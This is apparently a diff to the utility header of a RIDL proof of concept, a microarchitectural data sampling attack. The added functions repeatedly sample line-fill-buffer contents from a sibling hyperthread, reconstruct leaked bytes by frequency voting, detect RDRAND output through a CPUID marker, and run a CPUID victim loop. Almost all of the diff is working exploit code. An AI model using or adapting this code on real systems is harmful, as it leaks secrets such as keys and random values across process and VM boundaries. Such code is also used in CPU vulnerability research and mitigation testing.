@@ -8,12 +8,22 @@
 #include <pthread.h>
 #include <string.h>
 
+#ifdef TSX_AVAILABLE
+#define READ_SUCCESS_THRESHOLD 1000
+#define REPS 5000
+#else
+#define READ_SUCCESS_THRESHOLD 5000
+#define REPS 20000
+#endif
+
+
 #define TIMES_TEN(X) X X X X X X X X X X
 int _page_size = 0x1000;
 int writer_cpu = 3, reader_cpu = 7, offcore_cpu = 1, pid = 0, pid2 = 0;
 
-uint32_t vector_hits[64][256];
+int vector_hits[64][256];
 uint8_t vector[64];
+uint8_t byte_32;
 
 
 inline uint64_t time_convert(struct timespec *spec) { return (1000000000 * (uint64_t) spec->tv_sec) + spec->tv_nsec; }
@@ -53,6 +63,69 @@ void get_same_core_cpus(int *a, int *b) {
     *b = core_num - 1;
     fflush(stdout);
     fclose(cpuinfo_fd);
+}
+
+void fill_result_buffer(char* buffer, int start, int end){
+    for (int k = start; k < end; k++) {
+        int max = 0, max_i = -1;
+        for (int i = 1; i < 256; i++) {
+            if (vector_hits[k][i] > max) {
+                max_i = i;
+                max = vector_hits[k][i];
+            }
+        }
+
+        if (max > (float) REPS / READ_SUCCESS_THRESHOLD) {
+            buffer[k] = (char) max_i;
+        } else {
+            buffer[k] = '*';
+        }
+    }
+}
+
+void vector_read(void *mem, int _reps, char* buffer, int start, int end, int fill_complete_buffer) {
+    set_processor_affinity(reader_cpu);
+    memset(vector, 0, sizeof(vector[0]) * 64);
+    memset(vector_hits, 0, sizeof(vector_hits[0][0]) * 256 * 64);
+    int reps = _reps;
+    while (reps--) {
+        lfb_partial_vector_read(mem, vector, start, end);
+        for (int i = start; i < end; i++) {
+            int value = (int) vector[i];
+            if (value > 0 && value < 127) vector_hits[i][value & 0xFF]++;
+        }
+    }
+    if(fill_complete_buffer) fill_result_buffer(buffer, 0, 64);
+    else fill_result_buffer(buffer, start, end);
+}
+
+uint8_t get_byte_32(){
+    uint32_t ret;
+    asm volatile(
+            "mov $0x80000004, %%eax\n"
+            "cpuid\n"
+    : "=a" (ret)
+    :);
+    return (uint8_t)(ret & 0xFF);
+}
+
+int rdrand_section_changed(void* mem, uint8_t byte_32){
+    int success = 0;
+    for(int i = 0; i < REPS*3; i++){
+        success += lfb_read_offset(mem, 32) == byte_32;
+    }
+    return success == 0;
+}
+
+inline void *victim_cpuid(uint32_t leaf, int cpu) {
+    set_processor_affinity(cpu);
+    while (1) {
+        asm volatile(
+        "mov %0, %%eax\n"
+        "cpuid\n"
+        ::"r"(leaf)
+        : "eax", "ebx", "ecx", "edx");
+    }
 }
 
 #endif //RIDL_UTILS_H
